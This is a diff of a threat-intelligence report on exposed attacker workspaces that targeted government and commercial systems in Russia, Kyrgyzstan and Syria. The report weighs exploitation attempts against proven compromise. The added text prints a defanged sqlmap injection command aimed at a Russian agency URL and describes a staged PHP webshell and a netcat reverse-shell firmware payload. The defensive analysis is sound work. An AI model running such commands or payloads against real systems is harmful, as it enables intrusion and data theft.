+| Vulnerability or mechanism | Observed activity | Supported outcome |
 |---|---|---|
-| Roundcube **CVE-2025-49113** | Credential-supplied commands against four mail hosts | Exploitation attempts; success unknown |
-| PAN-OS **CVE-2024-3400** | Checker invocation and payload-generation tooling | The recorded checker syntax likely failed locally; no proven exploitation |
-| PHP-CGI **CVE-2024-4577** | RCE-capable scripts invoked against URL variants on one host | Attempts; no retained results |
-| ShareFile **CVE-2026-2699** | GET-based detection script used against six unique IPs | Detection requests; no captured exploitation chain |
-| Ivanti Sentry tooling labelled **CVE-2026-10520** | Scanner and lists containing 598 endpoint strings across 542 hosts | List-only targeting; no recorded scanner invocation or results |
-| Kerio Control / FreePBX | Malicious upgrade archive and authenticated-execution tooling | Payload preparation or attempted execution; no proven victim access |
+| Roundcube CVE-2025-49113 | Credential-supplied commands against four mail hosts | Repeated exploit attempts; no returned output |
+| PAN-OS CVE-2024-3400 | Checker invocation and payload-generation tooling | The recorded checker likely failed locally due to its arguments |
+| PHP-CGI CVE-2024-4577 | RCE-capable scripts run against three URL variants | Attempts; no results retained |
+| ShareFile CVE-2026-2699 | Detection script run against six unique IPs | Detection requests only |
+| Ivanti Sentry tooling labelled CVE-2026-10520 | 598 endpoints across 542 hosts in target lists | List-only targeting; no scanner execution captured |
+| Kerio Control | Reverse-shell firmware image and CSRF upgrade tooling | Payload prepared; delivery and execution unproven |
+| FreePBX API execution | Hardcoded target and reverse-shell command | Script run; authentication and callback unproven |
+| SQL injection | `sqlmap` run against a Russian federal-agency URL | Attempt; no result retained |
 
-The PAN-OS issue concerns command injection in affected GlobalProtect configurations; the PHP-CGI issue depends on particular Windows CGI and code-page conditions. Having the exploit does not establish those conditions on a target. [Palo Alto Networks advisory](https://security.paloaltonetworks.com/CVE-2024-3400), [PHP Group CVE description via NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-4577).
+The history also recorded this exact SQL injection command:
 
-The ShareFile distinction is similarly important. The retained tool checked the response to `/ConfigService/Admin.aspx`. Its use did not demonstrate execution of the broader configuration-access and RCE chain described in the vendor advisory. [ShareFile security advisory](https://docs.sharefile.com/en-us/sharefile/storage-zones-controller/5-0/security-vulnerability-feb26).
+```bash
+sqlmap -u "hxxps://fas.gov[.]ru/indikativnyj-tarif-na-transportirovku-nefti/indikat?eval_id=1"
+```
 
-The history also showed SQL-injection testing against a URL on Russia’s Federal Antimonopoly Service domain, `fas.gov[.]ru`, and execution of an incomplete-looking PHP/MySQL exploitation scaffold targeting `motcpiu[.]kg`. No successful result was retained for either.
+A stock p0wny PHP webshell named `shell.php` was staged locally. It supports command execution, file upload and download, directory navigation and several PHP execution functions. No evidence shows that it reached a victim.
 
-Across the workspace, 559 unique target hosts were identified, but only 17 appeared in directly operated tracks. The large Ivanti lists account for most of the total. Treating every list entry as a scanned or compromised organization would substantially overstate the evidence.
+A 154-byte `upgrade.img` contained a one-line netcat reverse shell intended for Kerio's custom-upgrade process. Preparation is proven; deployment is not.
 
-### Staged payloads and intended data collection
+This workspace shows opportunistic tradecraft and repeated manual experimentation. Mistyped commands, invalid option combinations and payload changes suggest the operator was troubleshooting interactively rather than running a mature automated platform.
 
-The callback address `89.124.123[.]216` recurred across several exploit tracks, using ports 443, 8080 and 8081. That repetition links the attempts within this workspace to common staging and callback infrastructure.
+## Comparative Analysis
 
-A stock **p0wny PHP webshell** named `shell.php` was present. It supports command execution and file transfer, but no evidence demonstrates deployment to a victim. A small `upgrade.img` archive contained an `upgrade.sh` reverse-shell payload intended for Kerio’s custom-upgrade mechanism. The archive’s presence proves preparation, not delivery or execution.
+The three directories show a common interest in government systems, but their access paths and outcomes differ sharply.
 
-No custom implant family or successful persistent C2 session was established. The operator relied on public exploits, ordinary shell utilities and short callback payloads.
-
-The intended collection included password-file contents, command output and, in PAN-OS tooling, configuration data. Actual theft is unproven. The shell history also lacks reliable activity timestamps, so the June discovery date cannot be converted into exact dates for the GKNB attempts.
-
-## What the Three Collections Show
-
-These workspaces demonstrate how government targeting can coexist with opportunistic exploitation, but they show different depths of access and different levels of evidentiary certainty.
-
-| Dimension | MChS / Russian commercial collection | MFA / Customs collection | GKNB / Russian-targeting collection |
+| Dimension | MChS and Union Travel | Kyrgyz MFA and Syrian Customs | GKNB and Russian targets |
 |---|---|---|---|
-| Target selection | Focused ministry shortlist within a mass-discovery corpus | MFA foothold followed by internal-service exploration; separate historical Customs inventory | Repeated webmail attempts alongside diverse appliance and application targets |
-| Principal technique | Authorization failures, weak credentials and exposed management APIs | Authenticated executable upload, agents and HTTPS transport | Public CVEs, supplied credentials and iterative callback payloads |
-| Strongest government result | Atlas administrative data access and application-state changes | Recorded MFA execution as `www-data`, implants and secret collection; provenance caveat | Targeting and attempts only |
-| Wider success | Commercial execution, network pivots and retained SQL/audio | Internal reachability; additional Kyrgyz host compromise unproven | No confirmed compromise in the supplied evidence |
-| Data evidence | Atlas configuration and integration secrets; commercial SQL, audio and other collected content | Application secrets, source/configuration and database metadata; no demonstrated business-record dump | Collection intent; no retained stolen data |
-| Tooling | Chisel, fscan and custom automation | VShell-compatible agents, PHP/Python bridge, separate stage loader | Public PoCs, shell callbacks, staged p0wny webshell |
+| Targeting | Focused MChS shortlist inside a mass-scan corpus | Government foothold followed by internal exploration; separate historical C2 cluster | Repeated webmail targeting inside a multi-product exploit workspace |
+| Initial access | Broken Atlas authorisation; default Zabbix credentials | Authenticated executable image upload | Public CVEs with supplied credentials |
+| Post-exploitation | Configuration theft, Zabbix commands, Chisel, fscan, SQL and audio collection | Webshell execution, secret discovery, local database access, VShell agents and a web relay | Callback listeners and payload iteration; no confirmed session |
+| Strongest success | Atlas data access and state changes; deep commercial compromise | Confirmed MFA execution and implants | Targeting and attempts only |
+| Government data | Atlas taxonomies, forms, privileges, integrations and two tokens | MFA application secrets and database schema; Syrian C2 identities | No retained stolen data |
+| Customisation | Short service-specific automation | Custom PHP and Python transport around VShell | Mostly public proof-of-concepts and stock shell tools |
+| Wider movement | Successful private-network pivot at Union Travel | Extensive discovery, but lateral logins failed | No target-side evidence of movement |
 
-**Tradecraft differed most in how operators tried to extend access.** The first collection shows a practical route from exposed administration to reverse tunnelling and internal discovery. The second records adaptation around connectivity failures, using a compromised website to transport agent traffic. The third shows extensive manual experimentation, including syntax mistakes and repeated payload changes, without the outputs needed to establish success.
+### Tradecraft
 
-**Opportunism and focused targeting were compatible.** MChS received specific attention inside a much larger scan corpus. GKNB webmail received repeated attempts inside a workspace covering several unrelated technologies. A broad target list does not make a focused government target incidental; conversely, one government target does not make every opportunistic action part of a coordinated espionage mission.
+The first workspace was efficient and repeatable. The operator converted exposed administration and default credentials into tunnels, internal discovery and collection.
 
-**Success should be assessed at the resource actually accessed.** Atlas suffered demonstrated application-level access and modification without a proven server shell. The MFA captures show server execution and secrets collection, but no verified root access or wider Kyrgyz takeover. The GKNB evidence establishes intent and attempts. Historical Customs registrations suggest access, with substantially less corroboration than the MFA command captures.
+The MFA records show more adaptive engineering:
 
-The most consequential common feature was the exposure of the workspaces themselves. Target lists, credentials, payloads, command histories and collected information became available together. That gave investigators visibility into the operators’ decisions and, in the first collection, created further distribution of already collected data.
+- A one-shot PHP upload established execution.
+- Direct staging failed.
+- Full agents were placed on disk.
+- C2 was carried through PHP, HTTPS, a Unix socket and Python.
+- The operator repeatedly repaired the relay.
 
-For defenders, the strongest lesson is to examine the chain of access rather than the length of an exploit list. Inconsistent API authorization, executable uploads, default credentials and reachable management services can turn a modest foothold into significant exposure. Public CVEs remain relevant, but these records show that successful access often depended on ordinary controls failing—and that many technically ambitious attempts still stopped short of a demonstrated compromise.
+The third workspace was more manual and error-prone. Its shell history shows public tooling, syntax changes and repeated listeners, but no preserved result that closes the loop.
+
+### Opportunism and targeting
+
+Focused government targeting and opportunistic scanning coexisted:
+
+- MChS was deliberately shortlisted inside a corpus of millions of IPs.
+- GKNB webmail was retried many times inside a workspace covering unrelated products.
+- Union Travel was a commercial target where weak management credentials led to deeper access than most government probes.
+- The Syrian Customs cluster may represent earlier access, a reused C2 database or a mixed analysis environment.
+
+A large list does not equal a large victim count. Success came where ordinary controls failed: inconsistent authorisation, executable uploads, default credentials and reachable management functions.
+
+### Success and impact
+
+The evidence supports this hierarchy:
+
+1. **Union Travel:** confirmed host execution, private-network pivot and theft of structured personal data and call audio.
+2. **Kyrgyz MFA:** confirmed web execution, application-secret collection, local database access and two running VShell-compatible agents.
+3. **MChS Atlas:** confirmed protected-data access and application-state modification, without a proven server shell.
+4. **Syrian Customs:** privileged C2 registrations with limited corroboration.
+5. **GKNB and other Russian targets:** repeated attempts, with no confirmed access in the supplied files.
+
+The exposure of the workspaces caused further harm. Stolen data, credentials, target lists and tools became available from the same servers. In the first collection, access logs show that unknown third parties downloaded material from the staging host, extending the breach beyond the original collector.
 
 ## IOCs
 
-The table contains operator infrastructure and malware or host artifacts supported by the exposed workspaces. Victim-owned public systems are deliberately excluded.
+The table contains operator infrastructure and malware or host artefacts supported by the exposed workspaces. Victim-owned public systems are excluded.
 
 | Indicator | Type | Context |
 |---|---|---|
@@ -297,6 +517,7 @@ The table contains operator infrastructure and malware or host artifacts support
 ## References
 
 - [Hunt.io](https://hunt.io/)
+- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
 - [Roundcube security updates 1.6.11 and 1.5.10](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10)
 - [Palo Alto Networks advisory for CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400)
 - [NVD entry for CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)
